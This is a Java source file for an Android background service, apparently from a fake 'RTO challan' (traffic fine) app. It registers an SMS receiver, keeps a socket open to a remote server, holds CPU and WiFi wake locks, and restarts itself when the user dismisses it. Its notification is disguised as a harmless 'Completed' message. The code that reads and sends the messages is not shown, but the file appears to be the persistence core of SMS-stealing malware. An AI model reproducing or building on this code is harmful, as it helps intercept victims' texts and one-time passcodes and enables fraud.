package com.service.rtochallan;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkRequest;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

public class RunningService extends Service {

    private static String CHANNEL_ID = "";
    private static String TAG = "";

    private SmsReceiver smsReceiver;
    private SocketManager socketManager;
    private Helper helper;

    private PowerManager.WakeLock wakeLock;
    private WifiManager.WifiLock wifiLock;

    private BroadcastReceiver legacyNetworkReceiver;
    private ConnectivityManager.NetworkCallback networkCallback;

    @Override
    public void onCreate() {
        super.onCreate();

        helper = new Helper();
        TAG = helper.TAG;
        CHANNEL_ID = helper.BG_CHANNEL_ID;
        helper.show("RunningService onCreate()");

        // ✅ Step 1: create notification channel
        createNotificationChannel();

        // ✅ Step 2: immediately start foreground (no delay)
        startForegroundNotification();

        // ✅ Step 3: move heavy setup to background thread
        new Thread(this::initializeBackgroundTasks).start();
    }

    private void initializeBackgroundTasks() {
        try {
            // ✅ Acquire Partial WakeLock — keeps CPU awake
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MyApp::CpuLock");
            wakeLock.acquire();

            // ✅ Acquire WiFiLock — keeps WiFi from sleeping
            WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            wifiLock = wifiManager.createWifiLock(WifiManager.WIFI_MODE_FULL_HIGH_PERF, "MyApp::WifiLock");
            wifiLock.acquire();

            // ✅ Register SMS receiver
            IntentFilter filter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
            smsReceiver = new SmsReceiver();
            registerReceiver(smsReceiver, filter);

            // ✅ Initialize and connect socket
            socketManager = SocketManager.getInstance(getApplicationContext());
            socketManager.connect();

            // ✅ Register network listener
            registerNetworkListeners();

            helper.show("RunningService initialized fully in background thread");

        } catch (Exception e) {
            helper.show("Error initializing RunningService: " + e.getMessage());
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        helper.show("RunningService onStartCommand");
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        helper.show("RunningService onDestroy()");
        if (socketManager != null && socketManager.isConnected()) {
            socketManager.deviceOfflineBy("Service destroyed", "offline");
            socketManager.disconnect();
        }

        if (smsReceiver != null) {
            try {
                unregisterReceiver(smsReceiver);
            } catch (Exception ignored) {}
            smsReceiver = null;
        }

        unregisterNetworkListeners();

        // ✅ Release locks when done
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        if (wifiLock != null && wifiLock.isHeld()) wifiLock.release();

        super.onDestroy();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        helper.show("On Bind...");
        return null;
    }

    // --------------------------------------------------------------------
    // 🔗 NETWORK DETECTION
    // --------------------------------------------------------------------
    private void registerNetworkListeners() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        networkCallback = new ConnectivityManager.NetworkCallback() {
            @Override
            public void onAvailable(Network network) {
                helper.show("Network Available");
                if (socketManager != null && !socketManager.isConnected()) {
                    socketManager.connect();
                }
            }

            @Override
            public void onLost(Network network) {
                helper.show("Network lost — disconnecting socket");
                if (socketManager != null) {
                    socketManager.disconnect();
                }
            }
        };

        NetworkRequest networkRequest = new NetworkRequest.Builder()
                .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                .build();
        cm.registerNetworkCallback(networkRequest, networkCallback);
    }

    private void unregisterNetworkListeners() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        if (networkCallback != null) {
            try {
                cm.unregisterNetworkCallback(networkCallback);
            } catch (Exception ignored) {}
        }
    }

    // --------------------------------------------------------------------
    // 🔔 FOREGROUND SERVICE SETUP
    // --------------------------------------------------------------------
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    "Background Service Channel",
                    NotificationManager.IMPORTANCE_HIGH
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(serviceChannel);
        }
    }

    @SuppressLint("ForegroundServiceType")
    private void startForegroundNotification() {
        Intent browserIntent = new Intent(Intent.ACTION_VIEW, android.net.Uri.parse("https://www.google.com"));
        browserIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

        PendingIntent pendingIntent = PendingIntent.getActivity(
                this,
                0,
                browserIntent,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
        );

        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Completed")
                .setContentText("Slide to close...")
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setContentIntent(pendingIntent)
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .setOngoing(true)
                .setSilent(true)
                .build();

        startForeground(1, notification);
    }


    @Override
    public void onTaskRemoved(Intent rootIntent) {
        helper.show("RunningService task removed — restarting");
        Intent restartServiceIntent = new Intent(getApplicationContext(), RunningService.class);
        restartServiceIntent.setPackage(getPackageName());

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            getApplicationContext().startForegroundService(restartServiceIntent);
        } else {
            getApplicationContext().startService(restartServiceIntent);
        }
        super.onTaskRemoved(rootIntent);
    }

}
